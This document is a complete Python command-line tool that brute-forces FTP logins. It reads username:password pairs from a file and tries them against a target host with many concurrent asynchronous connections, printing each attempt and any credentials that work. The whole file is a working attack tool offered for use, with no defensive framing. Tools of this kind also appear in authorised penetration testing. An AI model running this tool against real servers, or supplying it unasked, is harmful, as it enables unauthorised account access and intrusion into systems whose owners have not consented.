#!/usr/bin/env python3
import asyncio
import aioftp
import argparse


async def attempt_login(host, port, username, password, timeout=5):
    try:
        client = aioftp.Client()
        await asyncio.wait_for(client.connect(host, port), timeout)
        await asyncio.wait_for(client.login(username, password), timeout)
        await client.quit()
        return (username, password)
    except Exception:
        return None


async def brute_force_async(host, port, credentials, max_concurrent):
    semaphore = asyncio.Semaphore(max_concurrent)

    async def bound_attempt(user, pwd):
        async with semaphore:
            result = await attempt_login(host, port, user, pwd)
            await asyncio.sleep(0.5)
            if result:
                print(f"[+] Success: {user}/{pwd}")
            else:
                print(f"[*] Try: {user}/{pwd}")
            return result

    tasks = [bound_attempt(user, pwd) for user, pwd in credentials]

    results = []
    for coro in asyncio.as_completed(tasks):
        res = await coro
        if res:
            results.append(res)
    return results[0] if results else None


def read_credentials(file_path):
    credentials = []
    with open(file_path, "r") as f:
        for line in f:
            line = line.strip()
            if line and ":" in line:
                user, pwd = line.split(":", 1)
                credentials.append((user, pwd))
    return credentials


def main():
    parser = argparse.ArgumentParser(description="FTP Brute Force Tool using asyncio and aioftp.")
    parser.add_argument("host", help="FTP's IP address")
    parser.add_argument("file", help="File containing credentials (username:password) per line")
    parser.add_argument("-p", "--port", type=int, default=21, help="FTP port (default: 21)")
    parser.add_argument("-c", "--concurrent", type=int, default=50,
                        help="Number of concurrent connections (default: 50)")

    args = parser.parse_args()
    credentials = read_credentials(args.file)

    print(
        f"[*] Start brute force {args.host}:{args.port} with {len(credentials)} credential pairs, using {args.concurrent} concurrent tasks.")

    result = asyncio.run(brute_force_async(args.host, args.port, credentials, args.concurrent))

    if result:
        print(f"[+] Result: {result[0]}/{result[1]}")
    else:
        print("[-] Password not found.")


if __name__ == "__main__":
    main()
